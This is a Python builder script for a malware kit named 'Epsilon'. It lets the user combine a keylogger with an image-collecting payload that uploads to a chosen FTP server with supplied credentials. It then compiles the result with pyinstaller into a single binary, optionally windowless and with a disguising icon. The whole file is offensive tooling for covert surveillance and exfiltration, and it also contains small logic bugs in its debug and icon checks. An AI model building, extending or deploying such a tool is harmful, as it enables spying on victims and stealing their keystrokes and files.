import threading 
import os


print("Welcome to Epsilon!!!\n")
print("Select yor payloads (seprated by spaces) :")
print("1.Satelite")
print("2.KeyLogger")

DEBUG = True


keys = input("Give option(s) : ")
DEBUG = bool(input("Debug mode(True/False) : "))
Name = input("Provide name of the binary : ")
list_keys = [int(k) for k in keys.split(' ')]
File = open(Name+'.py','w')
iconfile = input("icon file for the binary (if not needed leave it) : ")
for i in list_keys:
    if i == 1 :
        File.write('from  payloads import satelite')
        File.write('\nsatelite.collectimage()\n')
       
        address = input("input ftp address : ")
        username = input("input ftp username : ")
        password = input("input ftp password : ")
        File.write('satelite.ADDRESS = \"'+address + "\"\n")
        File.write('satelite.USERNAME = \"'+username + "\"\n")
        File.write('satelite.PASSWORD = \"'+password + "\"\n")
    elif i == 2 :
        File.write('from  payloads import keylogger')
        File.write('\n')
   
File.close()
cmd = "pyinstaller "+ Name+".py" + " -F"
if not DEBUG :
   cmd = cmd + " --windowed"
if iconfile is not "":
    cmd = cmd + " --icon="+iconfile
os.system(cmd) 